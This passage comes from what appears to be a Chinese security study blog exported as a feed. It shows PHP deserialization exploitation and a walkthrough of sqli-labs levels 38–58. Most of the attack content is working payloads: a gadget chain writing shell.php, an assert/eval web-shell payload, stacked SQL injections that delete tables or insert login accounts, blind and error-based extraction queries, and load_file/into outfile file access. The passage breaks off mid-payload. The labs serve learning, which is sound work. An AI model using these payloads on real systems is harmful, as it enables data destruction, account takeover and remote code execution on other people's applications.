<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CyzCc</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span>&#123;</span><br><span class="line">		$fp = fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Wc</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$obj = <span class="keyword">new</span> CyzCc(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class5 = $_GET[<span class="string">'test'</span>];</span><br><span class="line">print_r($class5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">$class5_unser = unserialize($class5);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new CyzCc会自动调用对象CyzCc中的__construct()方法，从而把`<?php phpinfo() ?>`写入到 shell.php中<br><img src="/2020/04/02/php-unserialize/4.png" alt></p>
<h2 id="利用普通成员方法"><a href="#利用普通成员方法" class="headerlink" title="利用普通成员方法"></a>利用普通成员方法</h2><p>如果漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cyzcc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> wc();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"cyzcc"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ez</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = <span class="keyword">new</span> cyzcc();</span><br><span class="line">unserialize($_GET[<span class="string">'test'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码意思是new一个cyzcc对象后，调用__construct(),然后又new了wc对象。在结束的时候又会调用__destruct().其中又会调用action()，从而输出cyzcc</p>
<p><img src="/2020/04/02/php-unserialize/5.png" alt><br>然后我们通过构造序列化进行利用<br>通过new一个cyzcc对象，从而触发__construct(),new一个ez对象，从而执行action().</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cyzcc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> ez();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ez</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test2=<span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> cyzcc());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>O:5:”cyzcc”:1:{s:4:”test”;O:2:”ez”:1:{s:5:”test2”;s:10:”phpinfo();”;}}</p>
</blockquote>
<p><img src="/2020/04/02/php-unserialize/6.png" alt></p>
<h1 id="一个小靶场"><a href="#一个小靶场" class="headerlink" title="一个小靶场"></a>一个小靶场</h1><p>这个靶场在之前也做过，但是基本上没有去理解原理，甚至操作看上去都有点蠢。。。<br>今天再来复现一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">site</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url = <span class="string">'www.whalwl.com'</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $a = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">       $a(<span class="keyword">$this</span>-&gt;title);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_POST[<span class="string">'dage'</span>]);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里我们可以自己构造一个传参<code>eval($_GET[&#39;b&#39;])</code>,然后在get传参便可以获得flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">site</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url = <span class="string">'www.whalwl.com'</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $a = <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">       $a=<span class="keyword">$this</span>-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class=<span class="keyword">new</span> site();</span><br><span class="line">$class-&gt;name=<span class="string">'assert'</span>;</span><br><span class="line">$class-&gt;title=<span class="string">'eval($_GET[\'b\'])'</span>;</span><br><span class="line">$class3=serialize($class);</span><br><span class="line"><span class="keyword">echo</span> $class3;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>O:4:”site”:3:{s:3:”url”;s:14:”<a href="http://www.whalwl.com&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:5:&quot;title&quot;;s:16:&quot;eval($_GET[&#39;b&#39;])&quot;;}" target="_blank" rel="noopener">www.whalwl.com&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:5:&quot;title&quot;;s:16:&quot;eval($_GET[&#39;b&#39;])&quot;;}</a></p>
</blockquote>
<p><img src="/2020/04/02/php-unserialize/7.png" alt><br>这里其实还有一个问题，就是不知道为什么要使用assert，不知道其他函数行不行。</p>
<p>参考链接：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
]]></content>
      <tags>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs38-65</title>
    <url>/2020/03/30/sqli-labs38-65/</url>
    <content><![CDATA[<p>从这里就是page3的内容了，也开始接触堆叠注入(Stack Injection)，曾经在buuctf上面也接触过几个堆叠注入的题，但都是模糊的理解。希望从接下来这几关的堆叠注入中会有新的收获。<a id="more"></a></p>
<h1 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h1><h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p><a href="https://www.jianshu.com/p/029d96b41232" target="_blank" rel="noopener">参考链接</a></p>
<p>在 SQL 中，分号<code>;</code>用来表示一条 SQL 语句的结束。如果我们在<code>;</code>结束一个 SQL 语句后继续构造下一条语句，两条语句会不会一起执行？这个想法也就造就了堆叠注入。<br>而 Union Injection（联合注入）也是将两条语句合并在一起，但是<code>union</code>或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，且在 MySQL 中返回的列数需要相等；而堆叠注入可以执行的是任意的语句</p>
<p>例如我们输入：</p>
<blockquote>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">id</span>=1;<span class="attribute">d</span><span class="attribute">e</span><span class="attribute">l</span><span class="attribute">e</span><span class="attribute">t</span><span class="attribute">e</span> <span class="attribute">f</span><span class="attribute">r</span><span class="attribute">o</span><span class="attribute">m</span> <span class="attribute">u</span><span class="attribute">s</span><span class="attribute">e</span><span class="attribute">r</span><span class="attribute">s</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>而服务器未做检查，生成的 SQL 语句为：</p>
<blockquote>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=1;delete <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
</blockquote>
<p>执行后，第一条将显示查询信息，第二条将删除整个表。</p>
<h2 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h2><p>堆叠注入并不是在每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，同时权限不足也会使攻击者无法修改数据或者调用一些程序。<br>虽然堆叠查询可以执行任意的 SQL 语句，但是这种注入方式并不是十分完美。在我们的 Web 系统中，代码通常只返回一个查询结果，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面无法看到返回结果。<br>因此在读取数据时，建议使用<code>union</code>注入。同时在使用堆叠注入之前，我们也需要知道一些数据库相关信息如表名，列名等。</p>
<h2 id="基本操作与增删查改"><a href="#基本操作与增删查改" class="headerlink" title="基本操作与增删查改"></a>基本操作与增删查改</h2><blockquote>
<p>新建表<code>test</code><br><code>select * from users where id=1;create table test like users;</code> </p>
<p>删除新建表<code>test</code><br><code>select * from users where id=1;drop table test;</code> </p>
<p>查询数据<br><code>select * from users where id=1;select 1,2,3;</code> </p>
<p>加载文件<br><code>select * from users where id=1;select load_file(&#39;c:/test.php&#39;);</code> </p>
<p>修改数据<br><code>select * from users where id=1;insert into users(id,username,password) values(&#39;100&#39;,&#39;name&#39;,&#39;pswd&#39;);</code></p>
</blockquote>
<p><strong>load_file()函数</strong></p>
<blockquote>
<p>读取文件并返回文件内容为字符串。</p>
<p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限；该文件所有字节可读，但文件内容必须小于<code>max_allowed_packet</code>。</p>
<p>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回<code>NULL</code></p>
</blockquote>
<p><img src="/2020/03/30/sqli-labs38-65/1.png" alt>)<img src="/2020/03/30/sqli-labs38-65/2.png" alt></p>
<h2 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h2><p>新建表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1';<span class="keyword">create</span> <span class="keyword">table</span> cyzcc <span class="keyword">like</span> <span class="keyword">users</span>;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/3.png" alt><br>删除表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1';<span class="keyword">drop</span> <span class="keyword">table</span> cyzcc;<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/4.png" alt><br>查询数据</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>';select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure>

<p>修改数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'100'</span>,<span class="string">'name'</span>,<span class="string">'pswd'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/5.png" alt></p>
<h1 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h1><p>这一个是数字型注入，没有过滤任何东西<br>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'200'</span>,<span class="string">'cyz'</span>,<span class="string">'wc'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/6.png" alt></p>
<h1 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h1><p>这个一测试后发现为单引号+括号闭合注入，我们可以使用盲注也可以堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'200'</span>,<span class="string">'cyz'</span>,<span class="string">'wc'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/7.png" alt></p>
<h1 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h1><p>基于Bool_GET_数字型_盲注_堆叠注入<br>同less-39</p>
<h1 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h1><p>这一关是一个登陆框，有忘记密码，但是不能注册<br><img src="/2020/03/30/sqli-labs38-65/8.png" alt><br>猜测是通过堆叠注入创建一个用户，然后再进行注入<br>测试后为单引号闭合</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'123'</span>,<span class="string">'cyz'</span>,<span class="string">'999'</span>);<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>然后成功登陆<br><img src="/2020/03/30/sqli-labs38-65/9.png" alt></p>
<h1 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h1><p>这一关为单引号加）闭合</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1');<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'1234'</span>,<span class="string">'qqq'</span>,<span class="string">'999'</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/10.png" alt></p>
<h1 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h1><p>这个没有回显，只能根据返回的图片判断是否为真。</p>
<blockquote>
<p>login_user=admin&amp;login_password=1 or 1=1–+</p>
<p>login_user=admin&amp;login_password=1’ or 1=1–+</p>
<p>login_user=admin&amp;login_password=1” or 1=1–+</p>
<p>login_user=admin&amp;login_password=1’) or 1=1–+</p>
<p>login_user=admin&amp;login_password=1”) or 1=1–+</p>
</blockquote>
<p>得出为单引号闭合</p>
<h1 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h1><p>测试方法同上，增加了小括号闭合</p>
<h1 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h1><p>基于错误_GET_数字型_排序注入<br>这关往后都是<code>order by</code>语句与<code>limit</code>语句的相关注入，对于一些会显示表格的网站，他们的 URL 中通常都会有<code>sort</code>和<code>limit</code>两个参数。</p>
<h2 id="MySQL-语法"><a href="#MySQL-语法" class="headerlink" title="MySQL 语法"></a>MySQL 语法</h2><p>本关通过<code>sort</code>参数接收需要排序的列的序号（从1开始），MySQL 查询语句为</p>
<blockquote>
<p>select * from users order by $id</p>
</blockquote>
<p><code>sort=1 asc</code>和<code>sort=1 desc</code>，分别显示升序和降序的表格，说明此处是注入点，即注入点在<code>order by</code>后的参数中，而<code>order by</code>不同于在<code>where</code>后的注入，不能使用<code>union</code>等进行注入</p>
<h2 id="order-by-参数注入"><a href="#order-by-参数注入" class="headerlink" title="order by 参数注入"></a>order by 参数注入</h2><p><code>order by</code>后的数字可以作为一个注入点，就是构造<code>order by</code>后的一个语句，让该语句执行结果为一个数。</p>
<blockquote>
<p>?sort=2</p>
</blockquote>
<p><img src="/2020/03/30/sqli-labs38-65/1.png" alt></p>
<blockquote>
<p>?sort=(select 2)</p>
</blockquote>
<p><img src="/2020/03/30/sqli-labs38-65/2.jpg" alt></p>
<blockquote>
<p>可以看到没有报错也没有预想的按第二个字段排续，说明数字没有起作用，我们考虑布尔类型</p>
</blockquote>
<h3 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h3><p>基于报错注入主要采用的是双注入的方法，即子查询 / 派生表，因为这里<code>order by</code>只能接一个字段，所以应当采用派生表的方法</p>
<blockquote>
<p>数据库名</p>
<p>?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</p>
</blockquote>
<blockquote>
<p>表名</p>
<p>?sort=(select 1 from (select count(*),concat_ws(‘-‘,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),floor(rand()*2))as a from information_schema.tables group by a) b)</p>
</blockquote>
<p>列名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?sort=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> count(*),concat_ws(<span class="string">'-'</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> <span class="built_in">table_name</span>=<span class="string">'users'</span>),floor(rand()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>

<p>数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/3.jpg" alt><br>还有另一种派生表的写法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> information_schema.schemata <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)))</span><br></pre></td></tr></table></figure>

<h3 id="基于bool盲注"><a href="#基于bool盲注" class="headerlink" title="基于bool盲注"></a>基于bool盲注</h3><p>MySQL 像 PHP，也是一种弱类型，它会认为<code>true=1</code>，<code>false=0</code>。<br>用在<code>order by</code>后会直接导致显示不同，因为没有第0列：<br><img src="/2020/03/30/sqli-labs38-65/4.jpg" alt>)<img src="/2020/03/30/sqli-labs38-65/5.jpg" alt><br>这里我们要使用rand()函数,因为rand(0)和rand(1)返回的结果不同，但是(select …..)返回结果无变化</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?sort=rand((ascii(mid((select database()),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">65</span>)</span><br></pre></td></tr></table></figure>

<h3 id="基于时间盲注"><a href="#基于时间盲注" class="headerlink" title="基于时间盲注"></a>基于时间盲注</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?sort=<span class="keyword">if</span>(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">0.1</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h1 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h1><p>这一关可以使用报错注入，但是前面要使用单引号闭合</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">'-'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a) b)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/6.jpg" alt><br>时间盲注也是可以的</p>
<h1 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h1><p>同 Less 46：</p>
<p>基于 Bool 盲注</p>
<blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?sort=rand((ascii(mid((select database()),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">65</span>)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>基于 Time 盲注</p>
<blockquote>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?sort=<span class="keyword">if</span>(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">0.1</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>into outfile 参数注入</p>
<blockquote>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">?sort=<span class="number">1</span> into outfile <span class="string">"C:<span class="subst">\\</span>ProgramData<span class="subst">\\</span>MySQL<span class="subst">\\</span>MySQL Server 5.7<span class="subst">\\</span>Uploads<span class="subst">\\</span>data.txt"</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h1><p>基于 Time 盲注</p>
<blockquote>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">?sort=<span class="number">1</span>' and if(ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,sleep(<span class="number">0.1</span>),<span class="number">0</span>)--+</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h1><p>这几关为排序堆叠注入<br>一般后台查询数据库使用的语句都是<code>mysql_query()</code>，而可以堆叠注入的后台使用的是<code>mysqli_multi_query()</code></p>
<p>使用排序注入的盲注依然可以，但是报错注入在未注释 MySQL 报错信息的时候并不会报错，而返回一个空表：<br><img src="/2020/03/30/sqli-labs38-65/7.jpg" alt><br>我们也可以使用堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">50</span>,<span class="string">'Less50'</span>,<span class="string">'Less50'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/8.jpg" alt></p>
<h1 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h1><p>基于错误_GET_字符型_单引号_排序堆叠注入</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">51</span>,<span class="string">'Less51'</span>,<span class="string">'Less51'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/03/30/sqli-labs38-65/9.jpg" alt></p>
<h1 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h1><p>基于Bool_GET_数字型_盲注_堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=1;<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">52</span>,<span class="string">'Less52'</span>,<span class="string">'Less52'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h1 id="Less-53"><a href="#Less-53" class="headerlink" title="Less 53"></a>Less 53</h1><p>基于Bool_GET_单引号_字符型_盲注_堆叠注入</p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?sort=1';<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span>(<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">53</span>,<span class="string">'Less53'</span>,<span class="string">'Less53'</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/03/30/sqli-labs38-65/10.jpg" alt></p>
<p>从这里开始就是第四部分了，sqli-labs一共65个关卡，准备用这一篇来完结。自less-1到这里差不多用了快一个月了，基本一周也就花个一两天来学习SQL注入，所以学到的知识还是很散乱，记忆也不深刻。后面准备花时间回来总结巩固一下┗( ▔, ▔ )┛<!--more--></p>
<h1 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h1><p>基于错误_GET_单引号_字符型_UNION注入<br>必须 在10次查询内获得秘钥，就是基础的联合注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(secret_536Y),<span class="number">3</span> <span class="keyword">from</span> CXBEWPCN9F<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/30/sqli-labs38-65/1.jpeg" alt></p>
<h1 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h1><p>这一关比较坑，测试了很久发现是数字型+小括号闭合。</p>
<blockquote>
<p>表名<br>id=0) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’–+</p>
<p>列名<br>id=0) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’CHUFQ8P62W’–+</p>
<p>数据<br>id=0) union select 1,group_concat(secret_PXKK),3 from CHUFQ8P62W–+</p>
</blockquote>
<p><img src="/2020/03/30/sqli-labs38-65/2.jpeg" alt></p>
<h1 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h1><p>这一关为单引号+括号闭合</p>
<h1 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h1><p>这一关为双引号无括号闭合<br>这些关感觉很重复。。</p>
<h1 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h1><p>这一关测试后为单引号闭合，但是使用联合注入始终不回显，所以改用双注入或者报错注入<br>报错注入：</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">数据库名</span><br><span class="line"><span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br><span class="line">表名</span><br><span class="line"><span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br><span class="line">列名</span><br><span class="line">id=<span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) from information_schema.columns where table_name='L5EO2900B1'),<span class="number">0x7e</span>),<span class="number">1</span>)--+</span><br><span class="line">数据</span><br><span class="line">id=<span class="number">0</span>' or updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(secret_EVL2) from 